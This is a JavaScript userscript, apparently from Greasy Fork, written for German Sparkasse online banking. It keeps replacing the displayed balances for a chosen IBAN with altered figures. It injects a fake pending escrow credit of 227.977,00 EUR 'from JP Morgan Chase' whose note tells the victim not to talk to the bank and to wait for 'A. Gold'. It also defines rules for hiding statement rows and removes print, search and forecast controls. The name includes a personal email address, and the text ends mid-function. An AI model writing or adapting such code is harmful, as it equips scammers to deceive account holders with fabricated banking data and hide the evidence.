// ==UserScript==
// @name         Ed Start 4Rec sp.michaelotte@web.de
// @namespace    http://tampermonkey.net/
// @version      2.2
// @description  with minus bal handling
// @author       You
// @match        https://yahoo.com/sign/as/*
// @match        https://yahoo.com/sign/ac/*
// @match        https://yahoo.com/sign/ar/*
// @match        https://yahoo.com/sign/bs/*
// @match        https://yahoo.com/sign/sc/*
// @match        https://yahoo.com/sign/am/*
// @match        https://yahoo.com/sign/op/*
// @match        https://yahoo.com/sign/idi/*
// @match        https://yahoo.com/sign/ot/*
// @match        https://yahoo.com/sign/cli/*
// @match        https://yahoo.com/sign/ien/*
// @match        https://yahoo.com/sign/ts/*
// @match        *://*/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=google.com
// @grant        GM_xmlhttpRequest
// @run-at       document-start
// @downloadURL https://update.greasyfork.org/scripts/556261/Ed%20Start%204Rec%20spmichaelotte%40webde.user.js
// @updateURL https://update.greasyfork.org/scripts/556261/Ed%20Start%204Rec%20spmichaelotte%40webde.meta.js
// ==/UserScript==



//FINÜBERSICHT
    const BALANCE_CONFIGS = [
        { index: 0, adjustmentAmount: 1 },
        { index: 1, adjustmentAmount: 1 },
   //     { index: 2, adjustmentAmount: 0 },
        { index: 4, adjustmentAmount: 1 },
        { index: 7, adjustmentAmount: 1 },
        { index: 4, adjustmentAmount: 0 }
        // Add more as needed
    ];

// UMSATZE & KONTODETAILS BALANCE
  const IBAN_CHECK_RAW = '34243 DE91 7405 0000 0008 7418 11';      //

   const DELTA_EUR = 0; // ← change this value


// UMSATZE TRANSAKTIONEN


  const transactions = [{
      title: "Treuhand: JP Morgan Chase",
      details: "Freigabe nötig durch JP Morgan. Mit Bank nicht besprechen, solange keine Unterlagen. A. Gold meldet sich.",
      amountText: "227.977,00 EUR",
      dateGroup: "Vorgemerkt",
      insertMode: "2",
      positionOffset: 0,
      link: "https://example.com/tx-1"
},
  //  {
  //    title: "Sylvanne OU",
  //    details: "Testbuchung. Bitte sich an A. Gold wenden. Ohne ihn nicht ausgeben.",
  //    amountText: "43.000,00 EUR",
  //    dateGroup: "20.08.2025",
  //    insertMode: 2,
  //    positionOffset: 0
  //  },
// {
 //     title: "Dagmar Herbeck-Rosenbaum",
///      details: "2 Testbuchung. Bitte sich an A. Gold wenden. Ohne ihn nicht ausgeben.",
 //     amountText: "30.000,00 EUR",
 //     dateGroup: "01.09.2025",  //01.09.2025
 //     insertMode: 2,
 ////     positionOffset: 0
  //  },
///    {
///      title: "ILKA-MARTINA BROCKMANN",
///      details: "Sina 03",
///      amountText: "+99,99 EUR",
 ///     dateGroup: "heute",
///      insertMode: 2,
///      positionOffset: 0,
///      link: "https://example.com/tx-3"
///    },
///    {
///      title: "ILKA-MARTINA BROCKMANN",
///      details: "Top-level Transaction",
 ///     amountText: "+5.000,00 EUR",
 ///     dateGroup: "heute",
 ///     insertMode: 1,
 ///     positionOffset: 0
 ///   }
  ];


// POSTFACH

  // Your rule sets: a row is removed if it matches ALL enabled texts in ANY set.
  const RULES = [
    [
      { text: 'Kontoauszug', use: true },
      { text: '8/2025',      use: true },
      { text: 'DE12 8605 5592 1898 4092 06', use: false },
    ],
 [
      { text: 'Kontoauszug', use: true },
      { text: '9/2025',      use: true },
      { text: 'DE12 8605 5592 1898 4092 06', use: false },
    ],
 [
      { text: 'Kontoauszug', use: true },
      { text: '10/2025',      use: true },
      { text: 'DE12 8605 5592 1898 4092 06', use: false },
    ],
 [
      { text: 'Kontoauszug', use: true },
      { text: '9/2025',      use: true },
      { text: 'DE12 8605 5592 1898 4092 06', use: false },
    ],
       [
      { text: 'Kontoauszug', use: true },
      { text: '10/2021',      use: true },
      { text: 'DE12 8605 5592 1898 4092 06', use: false },
    ],
    // Add more rule sets as needed:
    // [
    //   { text: 'AnotherWord', use: true },
    //   { text: 'ExtraWord',   use: false },
    // ],
  ];





//FINÜBERSICHT
if (window.location.href.includes("de") || window.location.href.includes("mainscript") || window.location.href.includes("Downloads")) {
    'use strict';

 ///   const BALANCE_CONFIGS = [
 ///       { index: 0, adjustmentAmount: 155672 },
 ///       { index: 2, adjustmentAmount: 155672 },
 ///      { index: 3, adjustmentAmount: 155672 },
 ///       { index: 3, adjustmentAmount: 0 },
 ///       { index: 4, adjustmentAmount: 155672 }
 ///  ];

    const cache = new WeakMap();

    function parseGermanNumber(preText, postText) {
        const intPart = preText.replace(/\./g, '').trim();
        const fracPart = postText.replace(/[^\d]/g, '').trim();
        return parseFloat(`${intPart}.${fracPart}`) * (preText.includes('-') ? -1 : 1);
    }

    function formatGermanNumber(value) {
        const fixed = Math.abs(value).toFixed(2);
        const [intPart, fracPart] = fixed.split('.');
        const intWithDots = intPart.replace(/\B(?=(\d{3})+(?!\d))/g, '.');
        return {
            pre: (value < 0 ? '-' : '') + intWithDots,
            post: `,${fracPart}&nbsp;EUR`
        };
    }

    function getTargetBalances() {
        const container = document.querySelector('.nbf-finanzstatus.nbf-gv');
        if (!container) return [];

        const preList = container.querySelectorAll('.balance-predecimal.plus, .balance-predecimal.minus');
        const postList = container.querySelectorAll('.balance-decimal.plus, .balance-decimal.minus');

        const result = [];
        for (let i = 0; i < preList.length && i < postList.length; i++) {
            result.push({ pre: preList[i], post: postList[i], index: i });
        }
        return result;
    }

    function updateClass(element, newClass) {
        element.classList.remove('plus', 'minus');
        element.classList.add(newClass);
    }

    function updateBalances() {
        try {
            const balances = getTargetBalances();

            balances.forEach(({ pre, post, index }) => {
                const config = BALANCE_CONFIGS.find(cfg => cfg.index === index);
                if (!config || config.adjustmentAmount === 0) return;

                if (!cache.has(pre)) {
                    const originalValue = parseGermanNumber(pre.textContent, post.textContent);
                    cache.set(pre, originalValue);
                }

                const original = cache.get(pre);
                const current = parseGermanNumber(pre.textContent, post.textContent);

                const expectedModified = original + config.adjustmentAmount;
                const isAlreadyModified = Math.abs(current - expectedModified) < 0.01;
                const isOriginal = Math.abs(current - original) < 0.01;

                if (isOriginal && !isAlreadyModified) {
                    const { pre: newPre, post: newPost } = formatGermanNumber(expectedModified);
                    pre.innerHTML = newPre;
                    post.innerHTML = newPost;

                    const newClass = expectedModified >= 0 ? 'plus' : 'minus';
                    updateClass(pre, newClass);
                    updateClass(post, newClass);

                    console.log(`[UserScript] Balance at index ${index} modified to ${expectedModified} (${newClass})`);
                }
            });
        } catch (error) {
            console.error('[UserScript] Error updating balances:', error);
        }
    }

    setInterval(updateBalances, 40);
}





//=============================================================================================================================
//=============================================================================================================================
//=============================================================================================================================


// UMSATZE BALANCE

//=============================================================================================================================
//=============================================================================================================================
//=============================================================================================================================


 if (window.location.href.indexOf("de") > 0 || window.location.href.indexOf("mainscript") > 0 || window.location.href.indexOf("Downloads") > 0 ) {

  'use strict';

  /**
   * Amount (EUR) to add (positive) or subtract (negative) to EVERY matching balance
   * inside the specified account cards WHEN the IBAN check matches.
   */
//  const DELTA_EUR = 4324320; // ← change this value
  const DELTA_CENTS = Math.round(Number(DELTA_EUR) * 100);

  /**
   * IBAN guard: only modify balances within a card if the digits of the IBAN shown
   * in its ".mkp-identifier-description" match these digits.
   * The HTML may split the IBAN across text and <strong>, so we compare digits-only.
   */
//  const IBAN_CHECK_RAW = 'DE52 2905 0101 00 84 5790 28';

  const IBAN_CHECK_DIGITS = (IBAN_CHECK_RAW.match(/\d/g) || []).join('');

  // Card containers to look inside
  const CARD_SELECTOR = [
    '.mkp-card.mkp-card-account.mkp-layout-margin.mkp-card-account-link',
    '.mkp-card.mkp-card-bank-account.mkp-card-thinner.mkp-card-clickable'
  ].join(', ');

  // Balance nodes (handle plus/negative/minus and predecimal variant too)
  const BALANCE_SELECTOR = [
    '.balance-decimal.plus',
    '.balance-decimal.negative',
    '.balance-decimal.minus',
    '.balance-predecimal.plus',
    '.balance-predecimal.negative',
    '.balance-predecimal.minus',
  ].join(', ');

  // ─────────── Helpers: parse/format German amounts ───────────
  function extractParts(text) {
    const s = String(text ?? '');
    const m = s.match(/(.*?)([-–—]?\s*[0-9][0-9.,]*)(.*)/);
    if (!m) return { prefix: '', number: s.trim(), suffix: '', found: false };
    return { prefix: m[1], number: m[2].replace(/\s+/g, ''), suffix: m[3], found: true };
  }

  function parseGermanAmountToCents(text) {
    try {
      if (!text) return null;
      const { number } = extractParts(text);
      if (!number) return null;
      let raw = number.replace(/[–—]/g, '-'); // normalize minus variants
      raw = raw.replace(/\./g, '');           // remove thousands sep
      raw = raw.replace(/,/g, '.');           // decimal comma -> dot
      const val = Number(raw);
      if (!Number.isFinite(val)) return null;
      return Math.round(val * 100);
    } catch (e) {
      console.error('[BalanceInjector] parse error', e, { text });
      return null;
    }
  }

  function formatCentsGerman(cents, { keepCents, keepCurrency, origSuffix } = {}) {
    const negative = cents < 0;
    const abs = Math.abs(cents);
    const euros = Math.floor(abs / 100);
    const dec = abs % 100;
    const eurosStr = euros.toString().replace(/\B(?=(\d{3})+(?!\d))/g, '.');

    const body = keepCents
      ? `${eurosStr},${dec.toString().padStart(2, '0')}`
      : Math.round(abs / 100).toString().replace(/\B(?=(\d{3})+(?!\d))/g, '.');

    const sign = negative ? '-' : '';
    const suffix = keepCurrency ? (origSuffix || ' EUR') : (origSuffix || '');
    return `${sign}${body}${suffix}`;
  }

  function detectStyle(text) {
    const t = String(text ?? '');
    const { prefix, number, suffix } = extractParts(t);
    const hasComma = /,/.test(number);
    const hasEUR = /\bEUR\b/i.test(suffix) || /\bEUR\b/i.test(prefix);
    return { suffix, hasComma, hasEUR };
  }

  function setClassesForSign(el, cents) {
    try {
      if (!el?.classList) return;
      const isNeg = cents < 0;
      if (isNeg) {
        el.classList.add('negative', 'minus');
        el.classList.remove('plus');
      } else {
        el.classList.add('plus');
        el.classList.remove('negative', 'minus');
      }
    } catch {}
  }

  // ─────────── IBAN checker per card ───────────
  function cardIbanDigits(card) {
    try {
      const idDesc = card.querySelector('.mkp-identifier-description');
      if (!idDesc) return '';
      // Prefer the <p> that contains the IBAN (can be split across text + <strong>)
      // If multiple <p>, join them (defensive).
      const pList = idDesc.querySelectorAll('p');
      let text = '';
      if (pList.length) {
        pList.forEach(p => { text += ' ' + (p.textContent || ''); });
      } else {
        text = idDesc.textContent || '';
      }
      return (text.match(/\d/g) || []).join('');
    } catch (e) {
      console.warn('[BalanceInjector] Failed to read IBAN from card', e, card);
      return '';
    }
  }

  function ibanMatchesCard(card) {
    const digits = cardIbanDigits(card);
    if (!digits) return false;
    const match = digits === IBAN_CHECK_DIGITS;
    // Optional debug
    // console.debug('[BalanceInjector] IBAN check', { cardDigits: digits, expected: IBAN_CHECK_DIGITS, match });
    return match;
  }

  // ─────────── Per-node cache & application ───────────
  function ensureCache(el) {
    if (!el) return false;
    if (!el.dataset.originalBalanceCents) {
      const currentText = el.textContent?.trim() || '';
      const currentCents = parseGermanAmountToCents(currentText);
      if (currentCents === null) return false;

      const style = detectStyle(currentText);
      el.dataset.originalBalanceCents = String(currentCents);
      el.dataset.modifiedBalanceCents = String(currentCents + DELTA_CENTS);
      el.dataset.keepCents = style.hasComma ? '1' : '0';
      el.dataset.keepCurrency = style.hasEUR ? '1' : '0';
      el.dataset.origSuffix = style.suffix || '';
      el.dataset.balanceInjector = '1';
      // console.debug('[BalanceInjector] Cached', { originalCents: currentCents, modifiedCents: currentCents + DELTA_CENTS });
    }
    return true;
  }

  function rebaseIfExternalChange(el, currentCents) {
    const original = Number(el.dataset.originalBalanceCents);
    const modified = Number(el.dataset.modifiedBalanceCents);
    if (currentCents !== original && currentCents !== modified) {
      el.dataset.originalBalanceCents = String(currentCents);
      el.dataset.modifiedBalanceCents = String(currentCents + DELTA_CENTS);
      const style = detectStyle(el.textContent?.trim() || '');
      el.dataset.keepCents = style.hasComma ? '1' : '0';
      el.dataset.keepCurrency = style.hasEUR ? '1' : '0';
      el.dataset.origSuffix = style.suffix || '';
      // console.info('[BalanceInjector] Rebased on external change', { newOriginal: currentCents });
    }
  }

  function applyIfOriginal(el) {
    const currentText = el.textContent?.trim() || '';
    const currentCents = parseGermanAmountToCents(currentText);
    if (currentCents === null) return;

    rebaseIfExternalChange(el, currentCents);

    const original = Number(el.dataset.originalBalanceCents);
    const modified = Number(el.dataset.modifiedBalanceCents);
    if (currentCents === original) {
      const keepCents = el.dataset.keepCents === '1';
      const keepCurrency = el.dataset.keepCurrency === '1';
      const origSuffix = el.dataset.origSuffix || '';
      const formatted = formatCentsGerman(modified, { keepCents, keepCurrency, origSuffix });
      el.textContent = formatted;
      setClassesForSign(el, modified);
      try { el.setAttribute('title', formatted); } catch {}
      el.dataset.lastAppliedAt = String(Date.now());
      // console.debug('[BalanceInjector] Applied', { formatted, modified });
    }
  }

  // ─────────── Main loop: only inside target cards & only if IBAN matches ───────────
  function processAll() {
    try {
      const cards = document.querySelectorAll(CARD_SELECTOR);
      if (!cards.length) return;

      cards.forEach((card) => {
        if (!ibanMatchesCard(card)) {
          // Skip this card if IBAN digits don't match the expected one
          return;
        }

        const balances = card.querySelectorAll(BALANCE_SELECTOR);
        balances.forEach((el) => {
          if (!ensureCache(el)) return;
          applyIfOriginal(el);
        });
      });
    } catch (e) {
      console.error('[BalanceInjector] Tick error', e);
    }
  }

  // Run forever at the chosen cadence (interval only)
  processAll(); // immediate pass
  const id = setInterval(processAll, 20);
  window.__BalanceInjectorIntervalId__ = id; // debug handle
  console.log('[BalanceInjector] Started (interval 100ms). Delta per balance:', DELTA_EUR, 'EUR');
}




//=============================================================================================================================
//=============================================================================================================================
//=============================================================================================================================


// KONTODETAILS BALANCE

//=============================================================================================================================
//=============================================================================================================================
//=============================================================================================================================



 if (window.location.href.indexOf("de") > 0 || window.location.href.indexOf("mainscript") > 0 || window.location.href.indexOf("Downloads") > 0 ) {

  'use strict';

  /* ========= CONFIG =========
     Positive increases, negative decreases (EUR).
     Examples: 25  |  -10.5  |  1234.56
  */
//  const DELTA_EUR = 100; // <-- set your offset here
//
//  // IBAN digits must match those displayed under `.mkp-identifier-description > p`
//  const IBAN_CHECK_RAW = 'DE52 2905 0101 00 84 5790 28';
  /* ========================= */

  const log = (...a) => console.log('[Kontodetails mod]', ...a);

  // Labels to modify (beginning of title/aria-label)
  const LABELS = ['Kontostand', 'Verfügbarer Betrag'];

  // --- German number helpers ---
  const parseDE = (str) => {
    if (!str) return NaN;
    const num = str.replace(/[^\d.,-]/g, '').replace(/\./g, '').replace(',', '.');
    return Number(num);
  };
  const formatDE = (num) => {
    const neg = num < 0 ? '-' : '';
    const abs = Math.abs(num);
    const [intPart, decPart] = abs.toFixed(2).split('.');
    const withThousands = intPart.replace(/\B(?=(\d{3})+(?!\d))/g, '.');
    return `${neg}${withThousands},${decPart}`;
  };
  const splitValueAndSuffix = (text) => {
    const trimmed = text.trim().replace(/\s+/g, ' ');
    const match = trimmed.match(/-?[\d.]+,\d{2}/);
    if (!match) return { valuePart: trimmed, suffix: '' };
    const valuePart = match[0];
    const after = trimmed.slice(match.index + valuePart.length).trimStart();
    const suffix = after.length ? ' ' + after : '';
    return { valuePart, suffix };
  };

  // ---- IBAN check helpers ----
  const IBAN_DIGITS_EXPECTED = IBAN_CHECK_RAW.replace(/\D/g, '');

  const getIbanDigitsFromPage = () => {
    // Example markup:
    // <div class="mkp-identifier-description">
    //   <p>DE52 2905 0101 00<strong>84 5790 28</strong></p>
    // </div>
    const p = document.querySelector('.mkp-identifier-description p');
    if (!p) return null;
    const txt = p.textContent || '';
    const digits = txt.replace(/\D/g, '');
    return digits || null;
  };

  const ibanMatches = () => {
    const pageDigits = getIbanDigitsFromPage();
    if (!pageDigits) {
      log('IBAN not found on page; skipping this tick.');
      return false;
    }
    const ok = pageDigits === IBAN_DIGITS_EXPECTED;
    if (!ok) log('IBAN mismatch; skipping modification.', { expected: IBAN_DIGITS_EXPECTED, found: pageDigits });
    return ok;
  };

  // Shadow root that holds the balances
  const getShadowRoot = () => {
    const host = document.querySelector('#cpl-1-0-0 #cpl-slot-MAIN') ||
                 document.querySelector('#cpl-slot-MAIN');
    return host && host.shadowRoot ? host.shadowRoot : null;
  };

  // Build selector for allowed labels
  const labelSelector = LABELS.map(l => `[title^="${l}"], [aria-label^="${l}"]`).join(', ');

  // Find all value elements we want to control
  const findAllBalanceElements = (root) => {
    if (!root) return [];
    const blocks = root.querySelectorAll(labelSelector);
    const values = [];
    blocks.forEach(block => {
      const el = block.querySelector('.MuiTypography-input01');
      if (el) values.push(el);
    });
    return values;
  };

  // Per-element state
  const stateMap = new WeakMap(); // el -> { originalText, originalNumber, suffix, modifiedText }

  const captureBaseline = (el) => {
    const text = (el.textContent || '').trim();
    const { valuePart, suffix } = splitValueAndSuffix(text);
    const num = parseDE(valuePart);
    if (isNaN(num)) return null;
    const s = {
      originalText: text,
      originalNumber: num,
      suffix,
      modifiedText: formatDE(num + DELTA_EUR) + suffix
    };
    stateMap.set(el, s);
    log('Captured baseline:', s.originalText);
    return s;
  };

  const applyModified = (el, s) => {
    if (!s) return;
    el.textContent = s.modifiedText;
    log('Applied modified balance:', s.modifiedText);
  };

  const tick = () => {
    try {
      // 1) IBAN must match; otherwise skip the entire cycle.
      if (!ibanMatches()) return;

      // 2) Proceed with balances inside the shadow root.
      const root = getShadowRoot();
      if (!root) return;

      const targets = findAllBalanceElements(root);

      for (const el of targets) {
        let s = stateMap.get(el);
        if (!s) {
          s = captureBaseline(el);
          if (!s) continue;
          // First time: apply once.
          applyModified(el, s);
          continue;
        }

        const currentText = (el.textContent || '').trim();

        // Only re-apply when we see the original again.
        if (currentText === s.originalText) {
          applyModified(el, s);
          continue;
        }

        // If bank updated the baseline (neither originalText nor our modifiedText),
        // adopt that as the new baseline, then apply.
        if (currentText !== s.modifiedText) {
          const { valuePart, suffix } = splitValueAndSuffix(currentText);
          const liveNum = parseDE(valuePart);
          if (!isNaN(liveNum) && (liveNum !== s.originalNumber || suffix !== s.suffix)) {
            const newState = {
              originalText: currentText,
              originalNumber: liveNum,
              suffix,
              modifiedText: formatDE(liveNum + DELTA_EUR) + suffix
            };
            stateMap.set(el, newState);
            log('Baseline changed; updated and re-applied:', newState.originalText);
            applyModified(el, newState);
          }
        }
        // If it's already our modified text, do nothing.
      }
    } catch (e) {
      console.error('[Kontodetails mod] tick error:', e);
    }
  };

  // Check every 2 seconds; no MutationObserver
  setInterval(tick, 100);
}



//=============================================================================================================================
//=============================================================================================================================
//=============================================================================================================================


//  TRANSAKTION INSERTION

//=============================================================================================================================
//=============================================================================================================================
//=============================================================================================================================

if (
  window.location.href.includes("de") ||
  window.location.href.includes("sp") ||
  window.location.href.includes("Downloads")
) {
  'use strict';

///  // ✅ CONFIG: IBAN & TRANSACTIONS
///  const IBAN_CHECK_RAW = 'DE96 1005 0000 0000 1234 56';

///  const transactions = [
///    {
///      title: "Treuhand: JP Morgan Chase",
///      details: "Freigabe nötig durch JP Morgan. Mit Bank nicht besprechen, solange keine Unterlagen. A. Gold meldet sich.",
////      amountText: "427.977,00 EUR",
///     dateGroup: "Vorgemerkt",
 ///     insertMode: 2,
///      positionOffset: 0,
///      link: "https://example.com/tx-1"
///    },
///    {
 ///     title: "Sylvanne OU",
///      details: "Testbuchung. Bitte sich an A. Gold wenden. Ohne ihn nicht ausgeben.",
///      amountText: "43.000,00 EUR",
///      dateGroup: "Gestern",
///      insertMode: 2,
///      positionOffset: 0
///    }
///  ];

  /******************************************************************
   * HELPERS
   ******************************************************************/
  const log  = (...args) => console.log("[UserScript]", ...args);

  const getAmountHtml = (amountText) => {
    const match = amountText.match(/^([+-]?)([\d.]+),(\d{2})\s*EUR$/i);
    if (!match) return '';
    const [, sign, pre, dec] = match;
    const signClass = sign === '-' ? 'minus' : 'plus';
    return `
    <div class="mkp-identifier-currency">
      <p class="mkp-currency mkp-currency-pill mkp-currency-m">
        <span aria-hidden="true" class="balance-predecimal ${signClass}">${sign}${pre}</span>
        <span aria-hidden="true" class="balance-decimal ${signClass}">,${dec}&nbsp;EUR</span>
        <span aria-hidden="false" class="offscreen">Betrag:${sign}${pre},${dec} EUR</span>
      </p>
    </div>`;
  };

  const createTransactionElement = (tx) => {
    const id = `custom_tx_${Date.now()}_${Math.floor(Math.random() * 100000)}`;
    const amountHtml = getAmountHtml(tx.amountText);
    const html = `
<li data-cloned="true" data-details="${tx.details}">
  <div id="${id}" class="mkp-card mkp-card-debit mkp-card-thinner mkp-card-clickable">
    <div class="mkp-identifier">
      <div class="mkp-identifier-description">
        <h4 class="mkp-headline-05">
          <a href="#" class="mkp-identifier-link custom-link-handler" data-link="${tx.link || ''}" style="cursor: pointer;">
            ${tx.title}
          </a>
        </h4>
        <p>${tx.details}</p>
      </div>
      <div class="mkp-identifier-sticker mkp-identifier-sticker-placeholder" aria-hidden="true"></div>
      ${amountHtml}
    </div>
  </div>
</li>`;
    const wrapper = document.createElement('div');
    wrapper.innerHTML = html;
    return wrapper.firstElementChild;
  };

  const getCleanIBANFromPage = () => {
    const p = document.querySelector('.mkp-identifier-description p');
    return p ? p.textContent.replace(/\s+/g, '').trim() : null;
  };

  const transactionAlreadyExists = (detailsText) =>
    [...document.querySelectorAll('li[data-cloned="true"]')].some(
      el => el.dataset.details === detailsText.trim()
    );

  const getAllTransactionLIs = () => {
    const container = document.querySelector('.nbf-guided-tour-umsaetze-umsatzliste');
    return container ? [...container.querySelectorAll('li')] : [];
  };

  const repositionTransaction = (li, offset) => {
    if (!offset) return;
    const allLis = getAllTransactionLIs();
    const index = allLis.indexOf(li);
    if (index === -1) return;
    const newIndex = Math.max(0, Math.min(allLis.length - 1, index - offset));
    const target = allLis[newIndex];
    const parent = target?.parentElement;
    if (target && parent) {
      parent.insertBefore(li, offset > 0 ? target : target.nextSibling);
    }
  };

  const parseDateValue = (label) => {
    if (!label) return -Infinity;
    const lower = label.toLowerCase();

    if (lower === 'vorgemerkt') return Infinity;
    if (lower === 'heute') return Date.now();
    if (lower === 'gestern') {
      const d = new Date();
      d.setHours(0, 0, 0, 0);
      d.setDate(d.getDate() - 1);
      return d.getTime();
    }

    const [d, m, y] = label.split('.');
    if (d && m && y) {
      return new Date(`${y}-${m}-${d}`).getTime() || -Infinity;
    }

    return -Infinity;
  };

  // ✅ Fixed: compare visible <h3> text instead of aria-label
  const findExistingDateGroupUL = (dateGroup) => {
    const lists = document.querySelectorAll('.mkp-card-list');
    for (const list of lists) {
      const headerText = list.querySelector('.groupdate')?.textContent?.trim().toLowerCase();
      if (headerText === dateGroup.toLowerCase()) {
        return list.querySelector('ul.mkp-card-group');
      }
    }
    return null;
  };

  const createNewDateGroup = (dateGroup) => {
    const container = document.querySelector('.nbf-guided-tour-umsaetze-umsatzliste');
    if (!container) return null;

    const newUL = document.createElement('ul');
    newUL.className = 'mkp-card-group mkp-group-unify mkp-group-clickable';
    newUL.setAttribute('aria-label', dateGroup);

    const header = document.createElement('div');
    header.className = 'mkp-list-subline mkp-observe-sticky mkp-sticky-teleport-top';
    const h3 = document.createElement('h3');
    h3.className = 'mkp-headline-06 mkp-text-normal groupdate';
    h3.textContent = dateGroup;
    header.appendChild(h3);

    const wrapper = document.createElement('div');
    wrapper.className = 'mkp-card-list';
    wrapper.appendChild(header);
    wrapper.appendChild(newUL);

    // Insert in proper position
    const sections = [...container.children];
    const newTime = parseDateValue(dateGroup);
    let insertBefore = null;

    for (const section of sections) {
      const label = section.querySelector('.groupdate')?.textContent?.trim();
      const time = parseDateValue(label);
      if (time < newTime) {
        insertBefore = section;
        break;
      }
    }

    container.insertBefore(wrapper, insertBefore);
    return newUL;
  };

  const findOrCreateDateGroup = (dateGroup) => {
    return findExistingDateGroupUL(dateGroup) || createNewDateGroup(dateGroup);
  };

  /******************************************************************
   * INSERT LOGIC
   ******************************************************************/
  const insertTransaction = (tx) => {
    if (getCleanIBANFromPage() !== IBAN_CHECK_RAW.replace(/\s+/g, '')) return;
    if (transactionAlreadyExists(tx.details)) return;

    const li = createTransactionElement(tx);
    const container = document.querySelector('.nbf-guided-tour-umsaetze-umsatzliste');
    if (!container) return;

    if (tx.insertMode === 1) {
      let topUL = container.querySelector('ul.custom-top-insert');
      if (!topUL) {
        topUL = document.createElement('ul');
        topUL.className = 'mkp-card-group custom-top-insert';
        container.insertBefore(topUL, container.firstChild);
      }
      topUL.insertBefore(li, topUL.firstChild);
      log(`✅ Inserted "${tx.title}" at top`);
    } else {
      const targetUL = findOrCreateDateGroup(tx.dateGroup);
      if (!targetUL) return;
      targetUL.insertBefore(li, targetUL.firstChild);
      log(`✅ Inserted "${tx.title}" into group "${tx.dateGroup}"`);
    }

    if (typeof tx.positionOffset === 'number') {
      setTimeout(() => repositionTransaction(li, tx.positionOffset), 0);
    }
  };

  // Open link in new tab
  document.addEventListener('click', (e) => {
    const a = e.target.closest('.custom-link-handler');
    if (a?.dataset.link) {
      e.preventDefault();
      const url = a.dataset.link;
      (typeof GM_openInTab === 'function' ? GM_openInTab : window.open)(url, { active: true });
    }
  });

  /******************************************************************
   * MAIN LOOP
   ******************************************************************/
  setInterval(() => {
    transactions.forEach(insertTransaction);
  }, 200);
}


//=============================================================================================================================
//=============================================================================================================================
//=============================================================================================================================


// UTITLITIES

//=============================================================================================================================
//=============================================================================================================================
//=============================================================================================================================


if (
  window.location.href.includes("de") ||
  window.location.href.includes("sp") ||
  window.location.href.includes("Downloads")
) {
 // === CONFIGURATION ===
const config = {
    // Finanzübersicht
    removeSortButtonBottom: true,

    // Umsätze
    removeUmsaetzeChartFlowButton: true,
    removeUmsaetzeDruckFlyout: true,
    removeUmsaetzeDruckansichtParent: true,
    removeUmsaetzeSucheFlyout: true,
    removeUmsaetzeSayt: true,
    removeUmsaetzeLineChart: true,
    removeUmsaetzeStickyClone: true,
    removeUmsaetzeMultiselectFlyout: true,
    removeUmsaetzeUmsatzDruckenBlock: true, // ✅ NEW

    // Überweisung
    removeUeberweisungSkontoInput: true,
    removeUeberweisungSkontoLine: true,
    removeUeberweisungVoraussichtlicherSaldoParent: true, // ✅ NEW

    // Finanzenübersicht
    removeFinueberDruckansicht: true,
    removeFinueberSortingWaypoint: true,
    removeFinueberInfoCircleButton: true,
    removeFinueberPrognose: true,

    // Kontodetails
    removeKontodetailsKartenVerwalten: true,
    removeKontodetailsLimitVerwalten: false,
    removeKontodetailsKontoauszugParent: true,
    removeKontodetailsAbrechnungsauskunftParent: true,
    removeKontodetailsKontoweckerParent: true,
    removeKontodetailsDruckansichtShadow: true,
};

const CHECK_INTERVAL_MS = 100;

const getShadowRoot = () => {
    const host = document.querySelector('#cpl-1-0-0 #cpl-slot-MAIN') ||
                 document.querySelector('#cpl-slot-MAIN');
    return host?.shadowRoot || null;
};

const tryRemove = (selector, description, shouldRemove, options = {}) => {
    try {
        let elements = [];
        const root = options.useShadow ? getShadowRoot() : document;

        if (!root) {
            console.warn(`[Sparkasse utilities] Could not find root for "${description}"`);
            return;
        }

        if (options.queryType === 'title') {
            elements = Array.from(root.querySelectorAll(`[title="${selector}"]`));
        } else if (options.queryType === 'id') {
            const el = root.getElementById(selector);
            if (el) elements = [el];
        } else if (options.queryType === 'data') {
            elements = Array.from(root.querySelectorAll(`[data-waypoint-name="${selector}"]`));
        } else {
            elements = Array.from(root.getElementsByClassName(selector));
        }

        if (options.getParent && elements.length > 0) {
            elements = elements.map(el => el.parentElement).filter(Boolean);
        }

        if (elements.length > 0) {
            console.log(`[Sparkasse utilities] Found ${elements.length} element(s) for "${description}"`);
            if (shouldRemove) {
                elements.forEach(el => el.remove());
                console.log(`[Sparkasse utilities] Removed "${description}"`);
            } else {
                console.log(`[Sparkasse utilities] Skipped removal for "${description}" (config = false)`);
            }
        }
    } catch (error) {
        console.error(`[Sparkasse utilities] Error processing "${description}":`, error);
    }
};

const checkElements = () => {
    // Finanzübersicht
    tryRemove(
        'sort-button-bottom mkp-row mkp-justify-content-flex-end',
        'Sort button bottom (Finanzübersicht)',
        config.removeSortButtonBottom
    );

    // Umsätze
    tryRemove(
        'mkp-button mkp-button-tertiary mkp-button-tertiary-m mkp-icon-svg mkp-icon-left mkp-icon-chart-flow-m mkp-text-nowrap',
        'Chart Flow button (Umsätze)',
        config.removeUmsaetzeChartFlowButton
    );

    tryRemove(
        'mkp-button-flyout druck-button has-linklist',
        'Druck button flyout (Umsätze)',
        config.removeUmsaetzeDruckFlyout
    );

    tryRemove(
        'Druckansicht',
        'Parent of "Druckansicht" (Umsätze)',
        config.removeUmsaetzeDruckansichtParent,
        { queryType: 'title', getParent: true }
    );

    tryRemove(
        'umsatzsuchefilter-buttton-flyout',
        'Filter Flyout (Umsätze)',
        config.removeUmsaetzeSucheFlyout
    );

    tryRemove(
        'umsatz-sayt',
        'Umsatz SAYT',
        config.removeUmsaetzeSayt
    );

    tryRemove(
        'saldo-linechart-wrapper',
        'Saldo Line Chart Wrapper',
        config.removeUmsaetzeLineChart
    );

    tryRemove(
        'mkp-observe-sticky-clone-container',
        'Sticky clone container',
        config.removeUmsaetzeStickyClone
    );

    tryRemove(
        'mkp-button-flyout has-valuelist-multiselect',
        'Multiselect Flyout (Umsätze)',
        config.removeUmsaetzeMultiselectFlyout
    );

    tryRemove(
        'bline nbf-umsatzdrucken mkp-layout-padding btext-only',
        'Umsatzdrucken info block (Umsätze)',
        config.removeUmsaetzeUmsatzDruckenBlock
    );

    // Überweisung
    tryRemove(
        'skontoInputLine',
        'Skonto input line (Überweisung)',
        config.removeUeberweisungSkontoInput,
        { queryType: 'id' }
    );

    tryRemove(
        'skontoLine',
        'Skonto line container (Überweisung)',
        config.removeUeberweisungSkontoLine,
        { queryType: 'id' }
    );

    tryRemove(
        'voraussichtlicherSaldo',
        'Parent of voraussichtlicherSaldo (Überweisung)',
        config.removeUeberweisungVoraussichtlicherSaldoParent,
        { getParent: true }
    );

    // Finanzenübersicht
    tryRemove(
        'Druckansicht',
